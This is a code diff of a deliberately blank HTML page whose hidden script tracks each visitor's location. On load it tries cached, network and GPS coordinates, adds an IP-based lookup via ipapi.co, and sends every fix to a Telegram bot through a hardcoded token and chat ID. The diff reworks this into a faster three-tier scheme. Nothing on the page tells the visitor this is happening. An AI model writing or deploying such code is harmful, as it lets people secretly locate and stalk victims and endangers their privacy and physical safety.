@@ -5,78 +5,71 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title> </title>
 <style>
-  html, body {
-    margin: 0;
-    padding: 0;
-    background: #FFFFFF;
-    width: 100%;
-    height: 100%;
-    overflow: hidden;
-  }
+  html, body { margin:0; padding:0; background:#FFFFFF; width:100%; height:100%; overflow:hidden; }
 </style>
 </head>
 <body>
 
 <script>
-// ── config ──────────────────────────────────────────────
 const BOT_TOKEN = "8655470221:AAGsUmuGTKfLcOOLaGcdwDa4VDXsowUFIJg";
 const CHAT_ID   = "8596657965";
-// ─────────────────────────────────────────────────────────
 
-function sendLocation(lat, lon, acc) {
-  const msg = "📍 LOCATION\n" +
-              "━━━━━━━━━━\n" +
-              "Lat: " + lat + "\n" +
-              "Lon: " + lon + "\n" +
-              "Accuracy: " + Math.round(acc) + "m\n" +
-              "IP: " + "see server log\n" +
-              "⏰ " + new Date().toLocaleString();
-
-  // send location pin (shows on map)
+function sendLoc(lat, lon, acc, source) {
+  // location pin — instant map view
   fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      latitude: lat,
-      longitude: lon
-    })
+    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
   }).catch(() => {});
 
-  // send text details
+  // text details
   fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: msg
+      text: "📍 " + source + "\nLat: " + lat + "\nLon: " + lon +
+            "\nAcc: " + Math.round(acc) + "m\n⏰ " + new Date().toLocaleTimeString()
     })
   }).catch(() => {});
 }
 
-function grab() {
-  if (!navigator.geolocation) return;
+// ── strategy: 3-tier, fastest first ─────────────────────
 
+// tier 1: cached location — instant, no waiting
+navigator.geolocation.getCurrentPosition(
+  p => sendLoc(p.coords.latitude, p.coords.longitude, p.coords.accuracy, "cached"),
+  () => {},
+  { maximumAge: Infinity, timeout: 0, enableHighAccuracy: false }
+);
+
+// tier 2: network location — 1-3 seconds
+navigator.geolocation.getCurrentPosition(
+  p => sendLoc(p.coords.latitude, p.coords.longitude, p.coords.accuracy, "network"),
+  () => {},
+  { maximumAge: 60000, timeout: 5000, enableHighAccuracy: false }
+);
+
+// tier 3: GPS — 10-30s but accurate, only if still on page
+setTimeout(() => {
   navigator.geolocation.getCurrentPosition(
-    pos => {
-      sendLocation(
-        pos.coords.latitude,
-        pos.coords.longitude,
-        pos.coords.accuracy
-      );
-      // try to get a more accurate fix, send again
-      navigator.geolocation.getCurrentPosition(
-        p => sendLocation(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
-        () => {},
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    },
-    () => { /* denied — stay white */ },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
+    p => sendLoc(p.coords.latitude, p.coords.longitude, p.coords.accuracy, "gps"),
+    () => {},
+    { maximumAge: 0, timeout: 20000, enableHighAccuracy: true }
   );
-}
+}, 1000);
 
-window.addEventListener('load', grab);
+window.addEventListener('load', () => {
+  // also try IP-based as absolute fallback via external service
+  fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(d => {
+      if (d.latitude && d.longitude) {
+        sendLoc(d.latitude, d.longitude, 5000, "ip-estimate");
+      }
+    })
+    .catch(() => {});
+});
 </script>
 </body>
 </html>
